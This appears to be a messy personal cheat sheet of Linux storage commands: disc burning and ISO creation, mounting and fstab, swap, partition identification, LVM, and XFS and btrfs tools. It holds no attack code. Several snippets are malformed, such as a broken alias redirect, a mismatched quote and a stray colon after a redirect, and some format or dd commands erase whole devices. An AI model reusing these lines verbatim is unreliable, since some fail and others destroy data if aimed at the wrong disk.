	♦ Rock Ridge 	|| Contains the original file information (e.g. permissions, filename) for MS Windows 8.3 filenames
##------------------------------------------------------------------------------------------------------------------------##"






##---------------------------------------------------------------------------------------##
	cdparanoia ‐B                      || Copy the tracks to wav files In current dir ||
##---------------------------------------------------------------------------------------##
	lame ‐b 256 in.wav out.mp3         || Encode In mp3 256 kb/s 					  ||
##---------------------------------------------------------------------------------------##
	oggenc in.wav ‐b 256 out.ogg       || Encode In Ogg Vorbis 256 kb/s 			  ||
##---------------------------------------------------------------------------------------##



## ========================================================= ##
echo "burn the image to the CD-ROM as follows"
## ========================================================= ##
cdrecord -v dev=/dev/cdrom image.iso

cdrecord -v dev=/dev/cdrom image.iso -speed 8
cdrecord -v dev=/dev/cdrom image.iso -multi




creating optical discs, starting with mkisofs makes sense:

mkisofs -J -r -V “volume name” -o ../ image.iso ./



###############################################################
growisofs ‐dvd‐compat ‐Z /dev/dvd=imagefile.iso     # Burn existing iso image 
growisofs ‐dvd‐compat ‐Z /dev/dvd ‐J ‐R /p/to/data  # Burn directly
###############################################################

## ========================================================= ##
echo "Create and burn an ISO image"
dd if=/dev/hdc of=/tmp/mycd.iso bs=2048 conv=notrunc

mkisofs ‐J ‐L ‐r ‐V TITLE ‐o imagefile.iso /path/to/dir 		# Use mkisofs to create a CD/DVD image from files In a directory.

## ========================================================= ##
echo "create an ISO image is to use dd:"

dd if=/dev/cdrom of=image.iso

## ========================================================= ##
echo "create an ISO image from /dev/cdrom, use the following command:"

cat /dev/cdrom > image.iso

## ========================================================= ##
echo "write the ISO to a USB storage device, use the following command:"
## ========================================================= ##
dd if=image.iso of=/dev/sdb1 status=progress






make a new CD-ROM ISO from the /tmp/mylivecd directory:
mkisofs -l -v -J -V "My New LiveCD" -r -b base/boot.img -c base/boot.cat -hide -rr -moved -o /tmp/mylivecd.iso /tmp/mylivecd



cdrecord speed=8 dev=0,0,0 /tmp/mylivecd.iso



mkisofs -pad -l -r -J -v -V " KNOPPIX " -no-emul-boot -boot-load-size 4 -boot-info-table -b boot/isolinux/isolinux.bin -c boot/isolinux/boot.cat -hide-rr-moved -o knoppix.iso master/



growisofs -speed= 4 -Z /dev/dvdrw -J -r -V “volume name” ./








mount -t iso9660 -o loop image.iso /mnt/cdrom 			## mounts the image.iso file to /mnt/cdrom .








       To master and burn an ISO9660 volume with Joliet and Rock-Ridge extensions on a DVD or Blu-ray Disc:

            growisofs -Z /dev/dvd -R -J /some/files

       To append more data to same media:

            growisofs -M /dev/dvd -R -J /more/files

       Make sure to use the same options for both initial burning and when appending data.

       To finalize the multisession DVD maintaining maximum compatibility:

            growisofs -M /dev/dvd=/dev/zero

       To use growisofs to write a pre-mastered ISO-image to a DVD:

            growisofs -dvd-compat -Z /dev/dvd=image.iso






## ------------------------------------------------------------------------------------------------- ##
umount /dev/fd0					## Unmount a floppy disk
## ------------------------------------------------------------------------------------------------- ##
umount -l /dev/fd0 				## Unmount the floppy disk as soon as it is not In use anymore
## ------------------------------------------------------------------------------------------------- ##




### Mounts the device /dev/xvdj1 to /mnt/data with filesystem type "ext3"
mount -t ext3 /dev/xvdj1 /mnt/data		## 





## ------------------------------------------------------------------------------------------------- ##
e2label /dev/xvdj1 mydata			## Sets the device /dev/xvdj1 as it is now to the name mydata
## ------------------------------------------------------------------------------------------------- ##
e2label /dev/sda1 					## Print the label of the specified partition
## ------------------------------------------------------------------------------------------------- ##


## ------------------------------------------------------------------------------------------------- ##
LABEL="mydata" defaults 0 0			## /etc/fstab
## ------------------------------------------------------------------------------------------------- ##
UUID=4b0f5600-652f-4466-a4b8-52ebc752cf62	/mnt/data	ext3	defaults	0 0
## ------------------------------------------------------------------------------------------------- ##


## ------------------------------------------------------------------------------------------------- ##
/dev/sda1	swap	swap	defaults 0 0		## Example of swap partition
## ------------------------------------------------------------------------------------------------- ##
/mnt/swap	swap	swap	defaults 0 0		## Example of swap file
## ------------------------------------------------------------------------------------------------- ##


Setting Up Swap Space

sudo mkswap /dev/sdb6



check your swap area for bad blocks, use the -c option to mkswap :
# mkswap -c /dev/sda1



This command tells the kernel it can use the specified partition as swap space.

swapon /dev/sdb6

## set the swap partition’s priority to 0:
swapon -p 0 /dev/sdd1


swapon /swapfile
swapon /dev/hda8

free -m





## ######################## ##
## (Partitioning the disk) ##
## ######################## ##
mkfs.ext2 ‐L BOOT /dev/sda1
mkfs.ext3 ‐L ROOT /dev/sda2
mkfs.ext3 ‐L HOME /dev/sda3
mkswap ‐L SWAP /dev/sda4










alias du='du --human-readable --all --apparent-size --separate-dirs'


alias lsof="lsof -FpcfDi\n" >> "$file"








echo "##-=========================================================-##"
echo "   [+] Generate New UUID for the Partition					 "
echo "##-=========================================================-##"
uuidgen



echo "##-=========================================================-##"
echo "   [+] Change The Partitions UUID:							 "
echo "##-=========================================================-##"
tune2fs /dev/sda1 -U 41f7bc6e-ef8f-4601-b74a-fbaf24bd7b86



Universally Unique Identifiers (UUIDs)



The superblock is part of the file system metadata. It contains information about the
file system such as its size, the amount of free space In the file system, and where on the file
system the data can be found.

If a crash occurred and this superblock were damaged, you’d
have no way of determining which parts of the file system contained your data.


When you create a file system, 
the available disk space is divided into units of a specific size. 
These units are called blocks
By default they are 4KB In size.
A block can only hold one file or part of one file, 
so a 1KB file still uses up a whole block—and thus
4KB of disk space, wasting 3KB of storage space


Inodes are where most file systems store metadata 
such as creation and modification dates
permissions and ownership about a file or directory, 
as well as pointers to which blocks contain the actual file data. 
This means a file system can contain only as many files and directories as it has inodes. 
So, with a tiny block size and lots of files, 
you can run out of inodes before you run out of disk space.






Device Identification Details

• Vendor, make, and model
• Serial number or WWN
• Linux device name
• PCI domain:bus:slot.function
• PCI vendorID:deviceID
• USB bus:device
• USB vendorID:productID
• SCSI host:channel:target:lun





El Torito - ISO-9660 extension that allows a system to boot 
			from optical media using a ISO-9660 filesystem

Joliet		enable support for longer filenames and 
			allow the use of Unicode for internationalization purposes.

Rock Ridge	A series of ISO-9660 extensions (sometimes called attributes)
			enables the support of longer filenames (up to 255 bytes), 
			symbolic links
			8+ levels of directory hierarchy


Universal Disk Format (UDF) is a cross-platform specification


			Hierarchical File System (HFS)
can be used on partitions as well as optical media.
HFS filesystems are read-only and cannot be created or updated.
								
			HFS+ extended HFS
HFS+ filesystems are read/write on Mac OS.
On Linux, HFS+ filesystems are read-only, 
unless HFS+ journaling is disabled; then
writing is allowed.






-JR options were used with the mkisofs
command, which enables both Joliet and Rock Ridge extensions




Track At Once (TAO) writing mode

cdrecord -tao speed=0 dev=/dev/cdrom myBoot.iso





• Integrated Drive Electronics (IDE)
• Small Computer Systems Interface (SCSI)
• Universal Disk Format (UDF)
• Parallel ATA (PATA)
• Internet SCSI (iSCSI)

• External Serial ATA (eSATA)
• network attached storage (NAS)


• Solid-state drives (SSDs)






Internet Small Computer System Interface (iSCSI)
allows the transport of SCSI commands over TCP/IP.
to appear as if they are local SCSI drives.

storage area network (SAN)


Fibre Channel SAN - runs on optical fiber cables and 
offers speeds of up to 32 gigabits per second. 
It uses Fibre Channel Protocol (FCP) to transport 
SCSI commands over the dedicated network


ATA over Ethernet AoE is a network transport protocol 
But it doesnt use Internet protocol (10.0898 IP), 
instead it runs on network layer 2. 
ATA commands are transported over an Ethernet network. 
The network can be shared with other TCP/IP packets



Fibre Channel over Ethernet (FCoE) protocol - 
FCoE encapsulates Fibre Channel protocol frames for 
traveling over Ethernet networks.




WWN:  0x50014ee1599ff4fd

Logical Unit WWN Device Identifier: 50014ee25fcfe40c
		NAA						: 5
		IEEE OUI				: 0014ee
		Unique ID				: 25fcfe40c
Checksum: correct



WWID 

each SCSI device has a unique World Wide Identifier (WWID).


a device with a page 0x80 identifier would have:
scsi-SSEAGATE_ST373453LW_3HW1RHM6 -> ../../sda

a device with a page 0x83 identifier would have:
scsi-3600508b400105e210000900000490000 -> ../../sda

determine the device WWID, use the scsi_id command:
# scsi_id -g -u -s /block/sdc
3200049454505080f

## see any attached iSCSI disks along with their WWID
ls -l /dev/disk/by-id






iSCSI’s drive IQN 
used in many of the iSCSI configuration files and settings 
for identifying the target server’s offered SCSI drive.









target    - the remote system offering up an iSCSI disk
initiator - The local system desiring to use the offered iSCSI disk

client (initiator) 
server (target)






echo "##------------------------------------------------------------------##"
echo "   [+] logical unit number (LUN) is a number used to identify a		" 
echo "       unique logical SCSI device on the target system.				"
echo "##------------------------------------------------------------------##"


echo "##--------------------------------------------------------------##"
echo "   [?] LUN numbering starts at zero, so the first SCSI device		"
echo "        to be offered via iSCSI is typically assigned lun0		"
echo "##--------------------------------------------------------------##"


echo "##------------------------------------------------------------------------------------------##"
echo "   [?] iSCSI LUN can have an alias name up to 255 characters in length		"
echo "##------------------------------------------------------------------------------------------##"


















uses a SCSI device’s own VPD 0x80 or 0x83 page data 
(if those VPD pages are supported by the SCSI device) 
to generate this ID.


/lib/udev/scsi_id --help


echo "##-================================================================================-##"
echo "     [+] iSCSI Qualified Name (IQN) - a unique address that identifies the iSCSI		"
echo "##-================================================================================-##"




echo "   [?] Access the hidden SCSI mode pages with sdparm:"



echo "   [?] Running sdparm with the flags -a -l retrieves a"
echo "       Verbose list of disk parameters."

sdparm -a -l



echo "   [?] This more concise query extracts the Vital Product Data (VPD)"


echo "   [?] which provides unique identifying information about "
echo "       the make, model, and serial number of SCSI and SAS drives."

sdparm -i can








blockdev --report /dev/sda > wrtblk.txt


If the subject drive is attached via USB

bus:device (using -s ) 
		  or
vendor:product (using -d )



lsusb -v -s 2:2 > lsusb.txt
lsusb -v -d 13fe:5200 > lsusb.txt


## the -O flag will output all available columns in the output:

lsblk -O /dev/sda > lsblk.txt



## specifying the SCSI address
lsscsi -vtg -L 16:0:0:0 > lsscsi.txt






lsblkALL=`lsblk --all >> $TEMP_DIR/lsblkALL`
lsblkBytes=`lsblk --bytes >> $TEMP_DIR/lsblkBytes`
lsblkNoDeps=`lsblk --nodeps >> $TEMP_DIR/lsblkNoDeps`
lsblkDiscard=`lsblk --discard >> $TEMP_DIR/lsblkDiscard`
lsblkFS=`lsblk --fs >> $TEMP_DIR/lsblkFS`
lsblkAscii=`lsblk --ascii >> $TEMP_DIR/lsblkAscii`
lsblkPerms=`lsblk --perms >> $TEMP_DIR/lsblkPerms`
lsblkList=`lsblk --list >> $TEMP_DIR/lsblkList`
lsblkNoHeadings=`lsblk --noheadings >> $TEMP_DIR/lsblkNoHeadings`
lsblkPairs=`lsblk --pairs >> $TEMP_DIR/lsblkPairs`
lsblkRaw=`lsblk --raw >> $TEMP_DIR/lsblkRaw`
lsblkTopology=`lsblk --topology >> $TEMP_DIR/lsblkTopology`


list all attached storage devices, device paths, vendor, model, 
revision, serial number, World Wide Name (WWN), device name, 
size, physical and logical sector size, SCSI address, 
transport (USB, SATA, SAS, and so on), and more:







echo "##-=================================================================-##"
echo "   [+] Print the name of the specified partition, given its UUID		 "
echo "##-=================================================================-##"
blkid -U 652b786e-b87f-49d2-af23-8087ced0c667


echo "##-=================================================================-##"
echo "   [+] Print the UUID of the specified partition, given its label		 "
echo "##-=================================================================-##"
blkid -L /boot


probes for vfat, ext3 and ext4 filesystems
blkid --probe --match-types vfat,ext3,ext4 /dev/sda1


probes for all filesystem and other (e.g. swap) formats
blkid --probe --usages filesystem,other /dev/sda1





blkid -o device -t LABEL="$1"

ls -l /dev/disk/by-label/

echo "$1" | grep -q "LABEL="

echo "$1" | cut -d = -f 2




blkid -o device -t UUID="$1"

ls -l /dev/disk/by-uuid/







echo "$1" | grep -q "UUID="

echo "$1" | cut -d = -f 2



lsscsi










partprobe --summary
fdisk -cul /dev/sda
grep sdc /proc/partitions






echo "Lists partition layout..."

parted /dev/sda print				# Lists partition layout on all block devices



echo "Listing partition table(s)"

parted --list








/dev/disk/by-{label,uuid,partuuid,partlabel}/


blkstat -v -i list		## Supported image format types:

blkstat -v -f list		## Supported file system types:

echo "##-=================================================================-##"
echo "   [+] Print the name of the specified partition, given its UUID:		 "
echo "##-=================================================================-##"
findfs UUID=652b786e-b87f-49d2-af23-8087ced0c667 




echo "##-=================================================================-##"
echo "   [+] Print the name of the specified partition, given its label:	 "
echo "##-=================================================================-##"
findfs LABEL=/boot 


echo "##-=================================================================-##"
echo "   [+] Print the label of the specified partition, given its name:	 "
echo "##-=================================================================-##"
e2label /dev/sda1 









## ------------------------------------------------------------------------------------------------- ##
 									## 
## ------------------------------------------------------------------------------------------------- ##



## ------------------------------------------------------------------------------------------------- ##
findfs UUID=652b786e-b87f-49d2-af23-8087ced0c667 					## Print the name of the specified partition, given its UUID


## ------------------------------------------------------------------------------------------------- ##
findfs LABEL=/boot 				## Print the name of the specified partition, given its label
## ------------------------------------------------------------------------------------------------- ##



blkid | grep






ls -l /dev/disk/by-uuid


findmnt --fstab -t nfs			## Prints all NFS filesystems defined In /etc/fstab.
findmnt --fstab /mnt/foo		## Prints  all  /etc/fstab  filesystems  where  the  mountpoint directory is /mnt/foo.  I mounts where /mnt/foo is a source.
findmnt --fstab --evaluate		## Prints all /etc/fstab filesystems and converts LABEL= and UUID= tags to the real devic

findmnt --fstab --target /mnt/foo		## Prints all /etc/fstab filesystems where the mountpoint directory is /mnt/foo.

findmnt -n --raw --evaluate --output=target LABEL=/boot		## Prints only the mountpoint where the filesystem with label "/boot" is mounted.



findmnt --kernel --all --bytes --list --submounts --output SOURCE,TID,PROPAGATION,VFS-OPTIONS,OPT-FIELDS >> ~/findmnt.txt
















grep sda /proc/partitions



echo "## ================================ ##"
echo "   [+] Lists partition layout...		"
echo "## ================================ ##"



									______________________________________________
parted /dev/sda print				# Lists partition layout on all block devices
								    ______________________________________________
parted --list                       # lists partition layout on all block devices
									_________________________________________
showmount --all						# see all shared filesystems/directories





##-------------------------------------------------------------------------------------##
	parted /dev/sda print				# Lists partition layout on all block devices
##-------------------------------------------------------------------------------------##
	parted --list                       # lists partition layout on all block devices
##-------------------------------------------------------------------------------------##
	showmount --all						# see all shared filesystems/directories
##-------------------------------------------------------------------------------------##
	
##-------------------------------------------------------------------------------------##

##-------------------------------------------------------------------------------------##

##-------------------------------------------------------------------------------------##

##-------------------------------------------------------------------------------------##

##-------------------------------------------------------------------------------------##

##-------------------------------------------------------------------------------------##

##-------------------------------------------------------------------------------------##


echo "##-=================================-##"
echo "   [+] Listing partition table(s)		"
echo "##-=================================-##"
								   ______________________________________________
parted --list                      # lists partition layout on all block devices




echo "## ============================================== ##"
echo "   [+] see all shared filesystems/directories		 "
echo "## ============================================== ##"
showmount --all






echo "displaying the attributes of a physical volume"
pvdisplay --columns --all --verbose


echo "displaying the attributes of volume groups"
vgdisplay --verbose


echo "checking the volume group metadata"
vgck --verbose


echo "displays the attributes of a logical volume"
lvdisplay


echo "creates lvm2 information dumps for diagnostic purposes"
lvmdump


echo "scans for all the devices visible to lvm2"
lvmdiskscan





































echo "## ------------------------------------------------------------------------------------------------ ##"
echo "    • XFS 		## supports larger individual files (8EB) and filesystem sizes (16XB)				"
echo "## ------------------------------------------------------------------------------------------------ ##"
echo "    • btrfs	    ## B-tree structured filesystem, 													"
echo "                  ## allows snapshots (point In time backups, In real time)							"
echo "## ------------------------------------------------------------------------------------------------ ##"
echo "    • ext4		## journaled filesystem, can handle larger than 2TB files (up to 16TB)  			"
echo "                  ## max filesystem size increased from 16TB tp 1EB (exabyte)							"
echo "## ------------------------------------------------------------------------------------------------ ##"
echo "    •  		    ## "
echo "                  ## "
echo "## ------------------------------------------------------------------------------------------------ ##"
echo "    •  		## "
echo "## ------------------------------------------------------------------------------------------------ ##"
echo "## ================================================================================================ ##"


btrfs --help --full





echo "____________________________________________________________________________________"
echo "   || ----------------------------------------------------------------------- ||	"
echo "   || [+] xfsprogs - XFS is a high performance journaling filesystem			||	"
echo "   || ----------------------------------------------------------------------- ||	"
echo "   ||  {±} Originated from the SGI IRIX platform extended attributes			||	"
echo "   ||  	  - variable block sizes 											||	"
echo "   ||       - extent based													||	"
echo "   ||       - Makes extensive use of Btrees (Dir extents, free space)		||	"
echo "   ||          >> In order to aid both performance and scalability.			||	"
echo "(+)==============================================================================(+)"



XFS allows you to specify block size and defaults to 4096-byte blocks.

mkfs.xfs -b size=8192 /dev/sde1



mkfs.xfs -l logdev=/dev/sdb1,size=10000b /dev/sda1


mkfs.xfs -m crc=1 

mkfs.xfs -l internal -l size=250m -m crc=1 -L DontFuckItUp /dev/sdc

attr=2

/dev/sdc


Print XFS filesystem geometry

xfs_info /dev/sda1
xfs_growfs -n /dev/sda1


"bsize=4096" meaning the data block size for this filesystem is 4096 bytes.


echo "##-========================================================================================-##"
echo "   [+] Inode count - The count of the number of inodes supported by the filesystem. 			"
echo "                   Each inode contains information for one file								"  
echo "##-========================================================================================-##"
echo "##------------------------------------------------------------------------------------------##"
echo "   [?] so the number of inodes effectively limits the number of files you can store.)"
echo "##------------------------------------------------------------------------------------------##"






echo "##-========================================================================================-##"
echo "   [+] Synchronize the content of the home directory with the temporary backup directory."
echo "##------------------------------------------------------------------------------------------##"
echo "   [?] 


xfs_growfs





## ================================================================================================= ##
xfsdump -f /mnt/bkup /mnt/xfsdata		## Creates a file-based backup of the /mnt/xfsdata directory



echo "## ==================================================================== ##"
echo "   [+] Restoring a filesystem from a dump file:"

xfsrestore -f ./mydump -L session_label dest_dir

xfsrestore -f ./mydump -L 'session1' ./myfilesystem 




echo "## =========================================== ##"
echo "   [+] Dumping a filesystem to a dump tape:		"


xfsdump -f tapedevice -L session_label -M media_label file_system

xfsdump -f /dev/st0 -L 'session1' -M 'media1" /mnt/xfs0



echo "## ==================================================================== ##"
echo "   [+] Restoring a filesystem from a dump tape:

xfsrestore -f tapedevice -L session_label dest_dir

xfsrestore -f /dev/st0 -L 'session1' ./myfilesystem






-i 






echo "##-========================================================================-##"
echo -e "\t\t [?] xfsdump uses too high of a block size								"
echo "         This can result inn fails during the dump..							"
echo "##-========================================================================-##"
echo "## ------------------------------------------------------------------------ ##"
echo -e "\t\t [?] To fix this, use large block buffers:								"
echo "        This requires an increase inn the max number of segments				"
echo "## ------------------------------------------------------------------------ ##"
echo "        [?] A suggested number to use is 64 segments							"
echo "## ------------------------------------------------------------------------ ##"
echo "##-========================================================================-##"
insmod st max_sg_segs=64




echo "##-=========================================================-##"
echo "   [?] /etc/modules: kernel modules to load at boot time"
echo "##-=========================================================-##"



echo "##-=========================================================-##"
echo "   [+] Append changes to the kernel module file					"
echo "##-=========================================================-##"
echo "## --------------------------------------------------------- ##"
echo "   [?] This will create a persistent loadable conf file 		"
echo "    which is acted on during the kernel boot period			"
echo "    modify the max segment size attribute						"
echo "    Then, apply customized attribute to /etc/modules.conf		"
echo "##-=========================================================-##"

echo "options st max_sg_segs=64" >>/etc/modules.conf:





echo "##-========================================================================-##"
echo "  [+] OR you can add the module value to the kernel runtime args during boot	" 
echo "## ------------------------------------------------------------------------ ##"
echo "            (Temporary, reverts back to default after reboot):				"
echo "## ------------------------------------------------------------------------ ##"
echo "##-========================================================================-##"
st=max_sg_segs:64
    


grep xfsdump group





Each  dump  session  updates  an  inventory  database in 
/var/lib/xfsdump/inventory




The first level 	|| filesystem
The second level	|| session
The third level 	|| media stream (currently only one stream is supported).  
The fourth level 	|| media files ( lists the files sequentially composing the stream.)



hierarchical depth of the display

1 		|| only the  filesystem information from the inventory is displayed.

21 		|| only filesystem and session information are displayed. 

31 		|| only filesystem, session and stream information are displayed.


-I mnt=mount_point		## identifies the filesystem by mountpoint.

-I fsid=filesystem_id
            identifies the filesystem by filesystem ID.

-I dev=device_pathname		## identifies the filesystem by device.






















dump the root filesystem with tracing activated for all subsystems:

xfsdump -v trace -f /dev/tape /


enable debug-level tracing for drive and media operations:

xfsdump -v drive=debug,media=debug -f /dev/tape /


enable tracing for all subsystems, and debug level tracing for drive operations only:

xfsdump -v trace,drive=debug -f /dev/tape /


list files that will be excluded from the dump:

xfsdump -e -v excluded_files=debug -f /dev/tape /




xfsdump -f /mnt/backup /run/media/public/XFS


xfsrestore -f /mnt/backup /run/media/public/XFS



xfsrestore -I 





xfsrestore -f /mnt/bkup /mnt/xfsnewlocation

xfsrestore -t			## List the files In the backup while restoring the files


			## Lists basic xfs filesystem info on the indicated device





xfsrestore -v trace -f /dev/tape /							## restore the root filesystem with  
															## tracing activated for all subsystems:




xfsrestore -v drive=debug,media=debug -f /dev/tape /		## debug-level tracing for drive and media operations:



echo "##-================================================================-##"
echo "    [+] enable tracing for all subsystems, and debug level			"
echo "        tracing for drive operations only:							"
echo "##-================================================================-##"
xfsrestore -v trace,drive=debug -f /dev/tape /







xfs_repair (and xfs_check )


echo "## ------------------------------------------------------------ ##"
echo "   [?] "
echo "## ------------------------------------------------------------ ##"


echo "  [+] xfs_fsr - improves the layout of extents for each file by copying the entire "
echo "      file to a temporary location and then interchanging  the  data  extents  of  "
echo "      the target and temporary files In an atomic manner. This method requires that"
echo "      enough free disk space be available to copy any given file and that the space"
echo "      be less fragmented than the original file.




echo "##-============================================================-##"
echo "    [+] xfs_info - shows the FS geometry for a XFS FS.			"
echo "##-============================================================-##"
echo "## ------------------------------------------------------------ ##"
echo "			[?] xfs_info = xfs_growfs (with the -n option)			"	
echo "## ------------------------------------------------------------ ##"




##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_info /dev/sda1					## Print XFS filesystem geometry
xfs_growfs -n /dev/sda1 			## xfs_growfs does the same thing
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_info /dev/sdb1					## Query the filesystem for information:
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_admin -u /dev/vda1				## UUID associated with the noted LV:
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_growfs -n /dev/sdf1
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_admin -L ParrotSec /dev/sda		## Set the filesystem Label
 ##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
 
 
 
##-=========================================================================================================-##
	xfs_admin -j /dev/sda		## Enables version 2 log format (journal which supports larger log buffers)
##-=========================================================================================================-##
	xfs_admin -u /dev/sda1		## Display filesystems UUID
##-=========================================================================================================-##
	xfs_admin -l /dev/sda		## Display filesystems label
##-=========================================================================================================-##


echo "## ==================================================================== ##"
echo "## ========== Assign A UUID to the new disk with xfs_admin: =========== ##"
echo "## ==================================================================== ##"
xfs_admin -U 41f7bc6e-ef8f-4601-b74a-fbaf24bd7b86





cat /sys/fs/xfs/sdc/stats/stats


xfs_db


crc -r 					## Recalculate the current structure's correct CRC value, and write it to disk.
validates the CRC (checksum) field of the current structure





fsmap [ start ] [ end ]


log [stop | start filename]

metadump [-egow] filename
              Dumps metadata to a file.






blockget -n


ncheck 

-i  specifies an inode number to be printed. If no -i options are given then all inodes are printed.

                 -s  specifies that only setuid and setgid files are printed.

print



btrfs-show-super









##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##

##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_db -c frag -r /dev/sdb1			## Measure the current level of fragmentation on the disk:
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_fsr /dev/sdb1					## Defragment the xfs device:
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##




##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
xfs_metadump -a		## copy full metadata blocks, to provide more debugging information for a corrupted filesystem.

					## Normally, xfs_metadump will zero any stale  bytes



##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
-e				## Stops the dump on a read error. 
				## --------------------------------------------------------- ##
				## [?] Normally, it will ignore read errors 
				##     and copy all the  metadata that is accessible.
				## --------------------------------------------------------- ##
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
-g     			Shows  dump progress.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
-l logdev		## For filesystems which use an external log,
				## specifies the device where the external log resides.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
-m    			## Set  the  maximum  size  of  an  allowed metadata extent.

				## [?] The default size is  1000 blocks.

##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
-o				## Disables obfuscation of file names and extended attributes.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
-w				## Prints warnings of inconsistent metadata encountered to stderr. Bad metadata is still copied.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##







xfs_metadump  is  a  debugging  tool  that  copies the metadata from an XFS filesystem to a file.

xfs_metadump does not alter the source filesystem In any way.

xfs_metadump may only be used to copy unmounted filesystems, or read-only mounted filesystems.




xfs_metadump /dev/sda7  ~/dump-file

xfs_metadump /dev/sdd ~/xfs-metadata


xfs_metadump /dev/sda /home/xe1phix/xfs-metadata

-g 



The  file  generated  by  xfs_metadump  can be restored 
to filesystem image (minus the data) using the xfs_mdrestore tool






xfs_repair /dev/sda



xfs_repair -n /dev/sda1













echo "##-=========================================================-##"
echo "   [+] "
echo "##-=========================================================-##"
echo "## --------------------------------------------------------- ##"


By default Ext4 uses heuristics to select a block size of 1024, 2048, or 4096 bytes


With Btrfs its the node size or tree block size.

The default is the system page size - 16 kbytes (16384) - whichever is larger

mkfs.btrfs -n 65536 /dev/sde1

--label





echo "##-=========================================================-##"
echo "   [+] "
echo "##-=========================================================-##"
Create a filesystem across four drives (metadata mirrored, linear data allocation)
mkfs.btrfs /dev/sdb /dev/sdc /dev/sdd /dev/sde


echo "##-=========================================================-##"
echo "   [+] "
echo "##-=========================================================-##"
Stripe the data without mirroring
mkfs.btrfs -d raid0 /dev/sdb /dev/sdc


echo "##-=========================================================-##"
echo "   [+] "
echo "##-=========================================================-##"
Use raid10 for both data and metadata
mkfs.btrfs -m raid10 -d raid10 /dev/sdb /dev/sdc /dev/sdd /dev/sde


echo "##-=========================================================-##"
echo "   [+] "
echo "##-=========================================================-##"
Don’t duplicate metadata on a single drive (default on single SSDs)
mkfs.btrfs -m single /dev/sdb


echo "##-=========================================================-##"
echo "   [+] "
echo "##-=========================================================-##"
mkfs.btrfs -O list-all



mount -o device=/dev/sdb,device=/dev/sdc /dev/sda /mnt


/sys/fs/btrfs/UUID/features/


btrfs


It is designed to make the file system tolerant of errors, 
and to facilitate the detection and repair of errors when they occur. 

It uses checksums to ensure the validity of data and metadata,
and maintains snapshots of the file system that can be used for backup or repair. 


[!] The core data structure used by btrfs is the B-Tree


btrfs command --help --full

btrfs device scan


btrfs check

btrfs filesystem show

btrfs filesystem defrag

btrfs filesystem df

btrfs device stats /dev/

btrfs get property

btrfs filesystem show /dev/sdf

btrfs rescue

btrfs rescue zero-log

btrfs-select-super

btrfs-find-root

btrfs-convert

btrfs-show-super

btrfs inspect-internal dump-super --full --all device	

btrfs inspect-internal dump-tree
dump-tree 
btrfs sub snaps
btrfs subvolume snapshot

btrfs quota enable /dev/


